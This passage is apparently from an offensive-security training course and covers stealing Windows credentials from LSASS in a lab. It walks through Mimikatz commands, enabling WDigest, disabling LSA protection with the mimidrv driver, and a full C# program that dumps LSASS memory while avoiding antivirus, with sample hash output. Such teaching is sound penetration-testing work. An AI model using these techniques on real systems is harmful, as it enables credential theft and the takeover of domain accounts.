The service decrypts the service ticket using its own password hash, extracts the session key from it, and decrypts the supplied username. If the usernames match, the request is accepted. Before access is granted, the service inspects the supplied group memberships in the service ticket and assigns appropriate permissions to the user, after which the user may make use of the service as required.

This protocol may seem complicated and perhaps even convoluted, but it was designed to mitigate various network attacks and prevent the use of fake credentials.

Now that we have explored the foundations of Kerberos authentication, let's look at how we can dump cached credentials with Mimikatz.

1

(Wikipedia, 2020), [https://en.wikipedia.org/wiki/Kerberos_(protocol)](https://en.wikipedia.org/wiki/Kerberos_\(protocol\)) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_5356-1)

2

(Microsoft, 2020), [https://docs.microsoft.com/en-us/windows/win32/secauthn/key-distribution-center](https://docs.microsoft.com/en-us/windows/win32/secauthn/key-distribution-center) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_5356-2)

3

(Skip Duckwall, Benjamin Delpy, 2014), [https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It-wp.pdf](https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It-wp.pdf) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_5356-3)

4

(Microsoft, 2020), [https://docs.microsoft.com/en-us/windows/win32/ad/service-principal-names](https://docs.microsoft.com/en-us/windows/win32/ad/service-principal-names) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_5356-4)

### 15.3.2. Mimikatz

In this section, we'll discuss how Mimikatz may be used to extract credentials from memory due to caching requirements of the Kerberos protocol. We'll also discuss _Local Security Authority_ (LSA) protection[1](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_5357-1) and how it can be bypassed.

Due to the automatic renewal of TGTs, password hashes are cached in the _Local Security Authority Subsystem Service_ (LSASS) memory space.

If we gain access to these hashes, we could crack them to obtain the clear text password or reuse them to perform various actions (which we'll discuss in a later module).

Since LSASS is part of the operating system and runs as SYSTEM, we need SYSTEM (or local administrator) permissions to gain access to the hashes stored on a target. In addition, the data structures are not publicly documented and they are encrypted with an LSASS-stored key.

Mimikatz,[2](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_5357-2) written by security researcher Benjamin Delpy,[3](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_5357-3) is a powerful tool that we can use to extract and manipulate credentials, tokens, and privileges in Windows.

Warning

Do to the constantly evolving landscape of security tools, for the best results, we should copy the **mimikatz.exe** executable from the appsrv01 machine to the client machine.

In this section, we'll specifically use it to dump cached domain credentials and use it for other purposes later in this module.

After launching Mimikatz from an elevated command prompt on our Windows 10 victim machine, we'll have to tamper with the memory of the LSASS process, which is normally not allowed since it belongs to the SYSTEM user and not the current _offsec_ user.

However, as administrator, the _offsec_ user can use _SeDebugPrivilege_[4](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_5357-4) to read and modify a process under the ownership of a different user. To do this, we'll use the Mimikatz privilege::debug command to enable the _SeDebugPrivilege_ by calling _AdjustTokenPrivileges_ as shown in Listing 48.

```
C:\Tools\Mimikatz> mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #18362 Jul 10 2019 23:09:43
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz # privilege::debug
Privilege '20' OK
```

> Listing 48 - Enabling SeDebugPrivilege with Mimikatz

Once we have enabled the _SeDebugPrivilege_ privilege, we'll dump all cached passwords and hashes from LSASS with sekurlsa::logonpasswords:

```
mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 32785103 (00000000:01f442cf)
Session           : Interactive from 1
User Name         : offsec
Domain            : corp1
Logon Server      : DC01
Logon Time        : 11/18/2019 1:53:44 AM
SID               : S-1-5-21-1364860144-3811088588-1134232237-1106
        msv :
         [00000003] Primary
         * Username : offsec
         * Domain   : corp1
         * NTLM     : 2892d26cdf84d7a70e2eb3b9f05c425e
         * SHA1     : a188967ac5edb88eca3301f93f756ca8e94013a3
         * DPAPI    : 4f66481a65cbbdbda1dbe9554c1bd0ed
        tspkg :
        wdigest :
         * Username : offsec
         * Domain   : corp1
         * Password : (null)
        kerberos :
         * Username : offsec
         * Domain   : CORP1.COM
         * Password : (null)
        ssp :
        credman :
...
```

> Listing 49 - Dumping credentials with Mimikatz

The inner workings of the command are quite complex and beyond the scope of this module due to the inherent encryption and undocumented structures employed by LSASS, but the results show the NTLM hash of the domain _offsec_ user as shown in the highlighted section of Listing 49.

The _wdigest_[5](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_5357-5) authentication protocol requires a clear text password, but it is disabled in Windows 8.1 and newer. We can enable it by creating the _UseLogonCredential_ registry value in the path HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest. Once we set this value to "1", the clear text password will be cached in LSASS after subsequent logins.

Since 2012 (when Mimikatz was released and cached credential dumping was popularized), Microsoft has developed mitigation techniques: LSA Protection and _Windows Defender Credential Guard_.[6](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_5357-6) In this module, we will focus on LSA protection.

As previously mentioned, Windows divides its processes into four distinct integrity levels. An additional mitigation level, _Protected Processes Light_ (PPL)[7](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_5357-7) was introduced from Windows 8 onwards, which can be layered on top of the current integrity level.

In essence, this means that a process running at SYSTEM integrity cannot access or modify the memory space of a process executing at SYSTEM integrity with PPL enabled. To demonstrate this, we'll log on to the Windows 2019 server appsrv01 as the _admin_ user.

LSASS supports _PPL protection_,[8](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_5357-8) which can be enabled in the registry. This is done through the _RunAsPPL_ DWORD value in HKLM\SYSTEM\CurrentControlSet\Control\Lsa with a value of 1.

This protection mechanism is disabled by default due to third-party compatibility issues. On appsrv01 LSA Protection has already been configured.

When LSASS is executing as a Protected Process Light, Mimikatz fails due to insufficient permissions as shown in Listing 50.

```
C:\Tools\Mimikatz> mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #18362 Aug 14 2019 01:31:47
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords
ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)
```

> Listing 50 - Failure to dump passwords due to insufficient permissions

The sekurlsa::logonpasswords command returns the error value 0x00000005 (Access denied).

PPL protection is controlled by a bit residing in the EPROCESS kernel object associated with the target process. If we could obtain code execution in kernel space, we could disable the LSA protection and dump the credentials.

Luckily, this can be achieved with Mimikatz since it comes bundled with the mimidrv.sys driver.

We must be local administrator or SYSTEM to dump the credentials, which means we will also have the _SeLoadDriverPrivilege_ privilege and the ability to load any signed drivers. Mimikatz can load the mimidrv.sys driver with the !+ command:

```
mimikatz # !+
[*] 'mimidrv' service not present
[+] 'mimidrv' service successfully registered
[+] 'mimidrv' service ACL to everyone
[+] 'mimidrv' service started
```

> Listing 51 - Loading mimidrv.sys into the kernel

Once the driver is loaded, we can use it to disable the PPL protection for LSASS through the !processprotect command while supplying the /process: option to specify the name of the process and the /remove flag to disable PPL as shown in Listing 52.

```
mimikatz # !processprotect /process:lsass.exe /remove
Process : lsass.exe
PID 536 -> 00/00 [0-0-0]
```

> Listing 52 - Disabling LSA Protection with Mimikatz

While this technique will disable the LSA Protection it does require that we upload the mimidrv.sys driver to the victim machine, which may trigger antivirus.

Next, we'll again attempt to dump the cached credentials with sekurlsa::logonpasswords:

```
mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 225064 (00000000:00036f28)
Session           : Interactive from 1
User Name         : admin
Domain            : corp1
Logon Server      : DC01
Logon Time        : 11/19/2019 2:38:17 AM
SID               : S-1-5-21-1364860144-3811088588-1134232237-1107
        msv :
         [00000003] Primary
         * Username : admin
         * Domain   : corp1
         * NTLM     : 2892d26cdf84d7a70e2eb3b9f05c425e
         * SHA1     : a188967ac5edb88eca3301f93f756ca8e94013a3
         * DPAPI    : c4ba63d00510613add0c6fe2b3e65f16
        tspkg :
        wdigest :
         * Username : admin
         * Domain   : corp1
         * Password : (null)
        kerberos :
         * Username : admin
         * Domain   : CORP1.COM
         * Password : (null)
        ssp :
        credman :
...
```

> Listing 53 - Dumping credentials after disabling LSA protection

According to this output, we have bypassed LSA protection and have obtained the domain _admin_'s user NTLM hash.

In the next section, we'll discuss how to dump LSASS memory without Mimikatz.

#### Exercises

1. Log on to the Windows 10 victim VM as the _offsec_ user and dump the cached credentials with Mimikatz.
2. Dump the cached credentials by calling the Mimikatz _kiwi_[9](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_5357-9) extension from Meterpreter.
3. Log on to the Windows 2019 server appsrv01 as the _admin_ user and attempt to dump the cached credentials with Mimikatz.
4. Use the Mimikatz driver to disable LSA Protection on appsrv01 and dump the credentials.

1

(Microsoft, 2020), [https://docs.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection](https://docs.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_5357-1)

2

(Benjamin Delpy, 2020), [https://github.com/gentilkiwi/mimikatz](https://github.com/gentilkiwi/mimikatz) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_5357-2)

3

(Benjamin Delpy, 2020), [https://github.com/gentilkiwi](https://github.com/gentilkiwi) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_5357-3)

4

(Microsoft, 2020), [https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants](https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_5357-4)

5

(Kevin Joyce, 2019), [https://blog.stealthbits.com/wdigest-clear-text-passwords-stealing-more-than-a-hash/](https://blog.stealthbits.com/wdigest-clear-text-passwords-stealing-more-than-a-hash/) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_5357-5)

6

(Microsoft, 2020), [https://docs.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credential-guard](https://docs.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credential-guard) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_5357-6)

7

(Alex Ionescu, 2014), [http://www.nosuchcon.org/talks/2014/D3_05_Alex_ionescu_Breaking_protected_processes.pdf](http://www.nosuchcon.org/talks/2014/D3_05_Alex_ionescu_Breaking_protected_processes.pdf) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_5357-7)

8

(Microsoft, 2020), [https://docs.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection](https://docs.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_5357-8)

9

(Rapid7, 2017), [https://blog.rapid7.com/2017/01/27/weekly-metasploit-wrapup-2/](https://blog.rapid7.com/2017/01/27/weekly-metasploit-wrapup-2/) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_5357-9)

## 15.4. Processing Credentials Offline

In this section, we'll process the credentials "offline" by dumping the required memory section from the target's LSASS and uploading it to a different Windows machine, where we can safely extract the credentials. This will help avoid detection since Mimikatz will neither be uploaded to, nor run from, the target machine.

### 15.4.1. Memory Dump

First, we'll dump the process memory of LSASS. Windows allows us to create a _dump file_,[1](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_5359-1) which is a snapshot of a given process. This dump includes loaded libraries and application memory. In this example, we'll create the dump file with _Task Manager_.

To open Task Manager we'll right-click the task bar and select it. Next, we'll navigate to the _Details_ tab, locate the lsass.exe process, right-click it and choose _Create dump file_ as shown in Figure 5:

![[OffSec/OSEP/Course/z. images/7620473cb5319f05e2fa3d6821715cc4_MD5.jpg]]

Figure 5: Task Manager allows us to create a dump file

After dumping the process memory, the location of the dump file is presented in a popup (Figure 6):

![[OffSec/OSEP/Course/z. images/f19db712113eb5dc2f7bcde4ae672452_MD5.jpg]]

Figure 6: Dump file prompt

Once the dump file is created, we can copy it from the target to our local Windows client where we can parse it with Mimikatz.

When opening a dump file in Mimikatz, the target machine and the processing machine must have a matching OS and architecture. For example, if the dumped LSASS process was from a Windows 10 64-bit machine; we must also parse it on a Windows 10 or Windows 2016/2019 64-bit machine. However, processing the dump file requires neither an elevated command prompt nor _privilege::debug_.

In this example, we'll simulate offline parsing by copying the dump file to the C:\Toools\Mimikatz\ folder of the Windows 10 victim VM and we'll process it with Mimikatz there.

First, we'll run sekurlsa::minidump, supplying the name of the dump file to parse, followed by sekurlsa::logonpasswords to dump cached credentials:

```
C:\Tools\Mimikatz> mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #18362 Jul 10 2019 23:09:43
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz # sekurlsa::minidump lsass.dmp
Switch to MINIDUMP : 'lsass.dmp'

mimikatz # sekurlsa::logonpasswords
Opening : 'lsass.dmp' file for minidump...

Authentication Id : 0 ; 32785103 (00000000:01f442cf)
Session           : RemoteInteractive from 1
User Name         : admin
Domain            : corp1
Logon Server      : DC01
Logon Time        : 11/18/2019 1:53:44 AM
SID               : S-1-5-21-1364860144-3811088588-1134232237-1106
        msv :
         [00000003] Primary
         * Username : admin
         * Domain   : corp1
         * NTLM     : 2892d26cdf84d7a70e2eb3b9f05c425e
         * SHA1     : a188967ac5edb88eca3301f93f756ca8e94013a3
         * DPAPI    : 4f66481a65cbbdbda1dbe9554c1bd0ed
        tspkg :
        wdigest :
         * Username : admin
         * Domain   : corp1
         * Password : (null)
        kerberos :
         * Username : admin
         * Domain   : CORP1.COM
         * Password : (null)
        ssp :
        credman :
...
```

> Listing 54 - Loading and parsing a dump file with Mimikatz

This successfully dumps the _admin_ domain user's credentials, and does not require Mimikatz on the target machine.

There is, however, one obvious disadvantage to this technique: Task Manager cannot be run as a command line tool, so we'll need GUI access to the target. Alternatively, we can create the dump file from the command line with _ProcDump_[2](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_5359-2) from SysInternals.

Since ProcDump may also have a signature that could be recognized, in the next section we'll build our own code to create the dump file.

#### Exercises

1. Use Task Manager to create a dump file on your Windows 10 victim VM and parse it with Mimikatz.
2. Use ProcDump located in the C:\Tools\SysInternals folder to create a dump file and parse it with Mimikatz.

1

(Microsoft, 2018), [https://docs.microsoft.com/en-us/visualstudio/debugger/using-dump-files?view=vs-2019](https://docs.microsoft.com/en-us/visualstudio/debugger/using-dump-files?view=vs-2019) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_5359-1)

2

(Microsoft, 2017), [https://docs.microsoft.com/en-us/sysinternals/downloads/procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_5359-2)

### 15.4.2. MiniDumpWriteDump

In this section, we'll develop our own C# application to execute a memory dump that we can parse with Mimikatz.

When Task Manager and ProcDump create a dump file, they are invoking the Win32 _MiniDumpWriteDump_[1](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_5360-1) API. This means that we can write our own application in C# that does the same thing.

To begin, we'll go over the function prototype as shown in Listing 55:

```
BOOL MiniDumpWriteDump(
  HANDLE                            hProcess,
  DWORD                             ProcessId,
  HANDLE                            hFile,
  MINIDUMP_TYPE                     DumpType,
  PMINIDUMP_EXCEPTION_INFORMATION   ExceptionParam,
  PMINIDUMP_USER_STREAM_INFORMATION UserStreamParam,
  PMINIDUMP_CALLBACK_INFORMATION    CallbackParam
);
```

> Listing 55 - MiniDumpWriteDump function prototype

This function requires a lot of arguments, but only the first four are needed for our use case. The first two arguments (_hProcess_ and _ProcessId_) must be a handle to LSASS and the process ID of LSASS, respectively.

The third argument (_hFile_) is a handle to the file that will contain the generated memory dump, and the fourth (_DumpType_) is an enumeration type[2](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_5360-2) that we'll set to _MiniDumpWithFullMemory_ (or its numerical value of "2") to obtain a full memory dump.

With the foundational understanding of the API in place, we'll create a Visual Studio C# console app on the Windows 10 client called "MiniDump", select _Release_ build and set the CPU architecture to 64-bit.

Next, we'll use pinvoke.net to find the P/Invoke translated DllImport statement for _MiniDumpWriteDump_ as shown in Listing 56:

```
using System;
using System.Runtime.InteropServices;

namespace MiniDump
{
    class Program
    {
        [DllImport("Dbghelp.dll")]
        static extern bool MiniDumpWriteDump(IntPtr hProcess, int ProcessId, 
          IntPtr hFile, int DumpType, IntPtr ExceptionParam, 
          IntPtr UserStreamParam, IntPtr CallbackParam);
...
```

> Listing 56 - DllImport statement for MiniDumpWriteDump

Before we can call _MiniDumpWriteDump_, we have to set up the four required arguments. First, we'll obtain the process ID of LSASS and open a handle to it.

To get the process ID, we can use the _GetProcessesByName_[3](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_5360-3) method of the _Process_[4](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_5360-4) class (supplying the process name as a string) and select the _Id_ property:

```
Process[] lsass = Process.GetProcessesByName("lsass");
int lsass_pid = lsass[0].Id;
```

> Listing 57 - Obtaining the process ID of LSASS

We must include the _System.Diagnostics_ namespace to make use of the Process class.

We can obtain a handle to the LSASS process with the Win32 _OpenProcess_[5](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_5360-5) API, just as we would with process injection.

We must remember to execute the compiled application from an elevated command prompt, otherwise _OpenProcess_ will fail.

We'll include the DllImport statement for _OpenProcess_ and supply the arguments for full access, no inheritance, and the process ID of LSASS:

```
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace MiniDump
{
    class Program
    {
        [DllImport("Dbghelp.dll")]
        static extern bool MiniDumpWriteDump(IntPtr hProcess, int ProcessId, 
          IntPtr hFile, int DumpType, IntPtr ExceptionParam, 
          IntPtr UserStreamParam, IntPtr CallbackParam);

        [DllImport("kernel32.dll")]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, 
          int processId);

        static void Main(string[] args)
        {
            Process[] lsass = Process.GetProcessesByName("lsass");
            int lsass_pid = lsass[0].Id;

            IntPtr handle = OpenProcess(0x001F0FFF, false, lsass_pid);
...
```

> Listing 58 - Obtaining a handle to LSASS

Now that we have the first two arguments in place, we must set up the dump file. Instead of using the Win32 _CreateFile_[6](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_5360-6) API, we can take advantage of the _FileStream_[7](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_5360-7) class along with its constructor.

To instantiate the _FileStream_ object, we must supply two arguments: the name (lsass.dmp) and full path of the file and the _FileMode.Create_[8](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_5360-8) option, indicating that we want to create a new file. We'll also include the _System.IO_ namespace to use the _FileStream_ class:

```
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.IO;

namespace MiniDump
{
    class Program
    {
        [DllImport("Dbghelp.dll")]
        static extern bool MiniDumpWriteDump(IntPtr hProcess, int ProcessId, 
          IntPtr hFile, int DumpType, IntPtr ExceptionParam, 
          IntPtr UserStreamParam, IntPtr CallbackParam);

        [DllImport("kernel32.dll")]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, 
          int processId);

        static void Main(string[] args)
        {
            FileStream dumpFile = new FileStream("C:\\Windows\\tasks\\lsass.dmp", FileMode.Create);
            Process[] lsass = Process.GetProcessesByName("lsass");
            int lsass_pid = lsass[0].Id;

            IntPtr handle = OpenProcess(0x001F0FFF, false, lsass_pid);
...
```

> Listing 59 - Creating the empty dump file

Now that we have all the pieces in place, we can invoke _MiniDumpWriteFile_. When supplying the file handle argument to _MiniDumpWriteDump_, we must convert it to a C-style file handle through the _DangerousGetHandle_[9](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_5360-9) method of the _SafeHandle_[10](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_5360-10) class.

```
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.IO;

namespace MiniDump
{
    class Program
    {
        [DllImport("Dbghelp.dll")]
        static extern bool MiniDumpWriteDump(IntPtr hProcess, int ProcessId, 
          IntPtr hFile, int DumpType, IntPtr ExceptionParam, 
          IntPtr UserStreamParam, IntPtr CallbackParam);

        [DllImport("kernel32.dll")]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, 
          int processId);

        static void Main(string[] args)
        {
            FileStream dumpFile = new FileStream("C:\\Windows\\tasks\\lsass.dmp", FileMode.Create);
            Process[] lsass = Process.GetProcessesByName("lsass");
            int lsass_pid = lsass[0].Id;

            IntPtr handle = OpenProcess(0x001F0FFF, false, lsass_pid);
            bool dumped = MiniDumpWriteDump(handle, lsass_pid, dumpFile.SafeFileHandle.DangerousGetHandle(), 2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
```

> Listing 60 - Calling MiniDumpWriteDump to create a dump file of LSASS

After compiling the project, we can execute it from an elevated command prompt and generate a dump file as shown in Listing 61:

```
C:\Windows\Tasks> \\192.168.119.120\visualstudio\MiniDump\MiniDump\bin\x64\Release\MiniDump.exe

C:\Windows\Tasks> dir
 Volume in drive C has no label.
 Volume Serial Number is 564D-6BAE

 Directory of C:\Windows\Tasks

11/19/2019  06:20 AM    <DIR>          .
11/19/2019  06:20 AM    <DIR>          ..
11/19/2019  06:20 AM        49,099,206 lsass.dmp
               1 File(s)     49,099,206 bytes
               2 Dir(s)   5,823,295,488 bytes free
```

> Listing 61 - Creating a LSASS dump file from our custom C# application

With the dump file created, we can run Mimikatz to parse it as we did in the last section:

```
C:\Windows\Tasks> c:\Tools\Mimikatz\mimikatz.exe
...
mimikatz # sekurlsa::minidump lsass.dmp
Switch to MINIDUMP : 'lsass.dmp'

mimikatz # sekurlsa::logonpasswords
Opening : 'lsass.dmp' file for minidump...

Authentication Id : 0 ; 32785103 (00000000:01f442cf)
Session           : Interactive from 1
User Name         : offsec
Domain            : corp1
Logon Server      : DC01
Logon Time        : 11/18/2019 1:53:44 AM
SID               : S-1-5-21-1364860144-3811088588-1134232237-1106
        msv :
         [00000003] Primary
         * Username : offsec
         * Domain   : corp1
         * NTLM     : 2892d26cdf84d7a70e2eb3b9f05c425e
         * SHA1     : a188967ac5edb88eca3301f93f756ca8e94013a3
         * DPAPI    : 4f66481a65cbbdbda1dbe9554c1bd0ed
        tspkg :
        wdigest :
         * Username : offsec
         * Domain   : corp1
         * Password : (null)
        kerberos :
         * Username : offsec
         * Domain   : CORP1.COM
         * Password : (null)
        ssp :
        credman :
...
```

> Listing 62 - Parsing the dump file with Mimikatz

The output of Listing 62 reveals that our custom C# application did, in fact, create a valid dump file for LSASS.

By stepping away from pre-developed tools, we have improved our tradecraft and likely avoided antivirus detection.

#### Exercises

1. Write and compile a C# application that creates a dump file from LSASS as shown in this section.
2. Create a PowerShell script that calls _MiniDumpWriteDump_ to create a dump file.

1

(Microsoft, 2018), [https://docs.microsoft.com/en-us/windows/win32/api/minidumpapiset/nf-minidumpapiset-minidumpwritedump](https://docs.microsoft.com/en-us/windows/win32/api/minidumpapiset/nf-minidumpapiset-minidumpwritedump) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_5360-1)

2

(Microsoft, 2018), [https://docs.microsoft.com/en-gb/windows/win32/api/minidumpapiset/ne-minidumpapiset-minidump_type](https://docs.microsoft.com/en-gb/windows/win32/api/minidumpapiset/ne-minidumpapiset-minidump_type) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_5360-2)

3

(Microsoft, 2020), [https://docs.microsoft.com/en-us/dotnet/api/system.diagnostics.process.getprocessesbyname?view=netframework-4.8](https://docs.microsoft.com/en-us/dotnet/api/system.diagnostics.process.getprocessesbyname?view=netframework-4.8) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_5360-3)

4

(Microsoft, 2020), [https://docs.microsoft.com/en-us/dotnet/api/system.diagnostics.process?view=netframework-4.8](https://docs.microsoft.com/en-us/dotnet/api/system.diagnostics.process?view=netframework-4.8) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_5360-4)

5

(Microsoft, 2018), [https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_5360-5)

6

(Microsoft, 2018), [https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea](https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_5360-6)

7

(Microsoft, 2020), [https://docs.microsoft.com/en-us/dotnet/api/system.io.filestream?view=netframework-4.8](https://docs.microsoft.com/en-us/dotnet/api/system.io.filestream?view=netframework-4.8) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_5360-7)

8

(Microsoft, 2020), [https://docs.microsoft.com/en-us/dotnet/api/system.io.filemode?view=netframework-4.8](https://docs.microsoft.com/en-us/dotnet/api/system.io.filemode?view=netframework-4.8) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_5360-8)

9

